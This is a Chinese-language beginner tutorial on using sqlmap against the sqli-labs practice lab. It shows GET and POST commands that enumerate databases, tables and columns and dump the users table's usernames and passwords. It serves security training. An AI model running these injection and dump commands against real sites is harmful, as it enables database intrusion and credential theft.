# sqlmap入门使用

## GET请求方式

**以sqli-labs第1关为例：**

地址栏里面的路径就是请求的链接

假设请求链接为：http://193.168.10.26/Less-2/?id=2

使用sqlmap尝试能不能SQL注入：

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" --batch
```

`--batch` 是指：不询问用户输入，使用所有默认配置



在运行结果里可以看到使用的**数据库类型**和**几个可以注入的点**

尝试获取所有数据库：`sqlmap.py -u url --dbs --batch`

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" --dbs --batch
```



获取当前数据库：`sqlmap.py -u url --current-db --batch`

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" --current-db --batch
```



获取数据库中的表：`sqlmap.py -u url -D DB --tables --batch`

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" -D security --tables --batch
```



获取表中的列：`sqlmap.py -u url -D DB -T TBL --columns --batch`

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" -D security -T users --columns --batch
```



获取列中的数据：`sqlmap.py -u url -D DB -T TBL -C COL --dump --batch`

```shell
sqlmap.py -u "http://193.168.10.26/Less-2/?id=2" -D security -T users -C "id,username,password" --dump --batch
```

<br>

## POST请求方式

post与get方式区别不大

**以sqli-labs第11关为例：**

先抓包查看请求：

```
请求地址：http://193.168.10.26/Less-11/
参数：uname=abc&passwd=cba
```



和get请求类似，构造sqlmap命令

```shell
sqlmap.py -u "http://193.168.10.26/Less-11/" --method=POST --data="uname=abc&passwd=cba" --dbs --batch
```

以上命令和get请求的区别就在于： `--data` 和 `--method` 部分，其余的和get方式一样

同理，可以构造一个爆库的命令：

```shell
sqlmap.py -u "http://193.168.10.26/Less-11/" --method=POST --data="uname=abc&passwd=cba" -D security -T users -C "id,username,password" --dump --batch
```

